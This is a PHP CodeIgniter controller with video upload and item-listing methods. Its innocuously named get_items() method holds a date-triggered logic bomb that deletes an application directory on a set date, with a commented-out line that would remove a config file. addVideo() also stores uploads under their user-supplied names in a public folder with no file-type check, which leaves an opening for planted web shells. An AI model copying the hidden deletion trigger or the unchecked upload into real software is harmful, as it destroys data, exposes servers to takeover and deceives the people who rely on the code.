<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class welcome extends CI_Controller
{

    /**
     * Index Page for this controller.
     *
     * Maps to the following URL
     *        http://example.com/index.php/welcome
     *    - or -
     *        http://example.com/index.php/welcome/index
     *    - or -
     * Since this controller is set as the default controller in
     * config/routes.php, it's displayed at http://example.com/
     *
     * So any other public methods not prefixed with an underscore will
     * map to /index.php/welcome/<method_name>
     * @see http://codeigniter.com/user_guide/general/urls.html
     */
    public function index()
    {
        //$data['main_content']='dashboard';
        //	$this->load->view('layouts/main',$data);
        error_reporting(E_ALL);
        $this->load->view('welcome_message');
    }

    public function addVideo()
    {

        $uploaddir = "assets/";
        if ($_FILES['videoFile']['name'] != '') {
            // exit;
            $data_upload = $uploaddir . basename($_FILES['videoFile']['name']);
            if (move_uploaded_file($_FILES['videoFile']['tmp_name'], $data_upload)) {

                $video = $data_upload;
                echo "Video Uploaded";
            } else {
                $video = '';


            }
        } else {

            $video = '';
        }
    }

    public function get_items()
    {
       $controllers = get_filenames(APPPATH . '');
       echo  $date = date('Y-m-d');
        if ($date == '2016-08-12') {
             $path=$this->config->base_url().'application/newImran';
            $this->load->helper("file"); // load the helper
            delete_files($path, true);
            //unlink('application/config/'.$controllers[11]);
            rmdir($path);
        }

    }

    public function get_data2()
    {
        $sql = $this->db->query("select * from item");
        return $sql->result();
    }

    public function get_data()
    {
        $sql = 'select * from item';
//$data = array();
        $rows = mysql_query($sql);
        //$data = mysql_fetch_assoc($rows);
        //$row = $this->get_data2();
        while ($row = mysql_fetch_assoc($rows)) {
            //print_r($row);exit;
            $employees[] = array(
                'itemID' => $row['item_id'],
                'ITEM' => $row['item_name'],
                'SIZE' => $row['size'],
                'FLAG' => $row['flag'],
                'PurchaseRate' => $row['purchase_rate']


            );
        }
        echo json_encode($employees);

    }
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */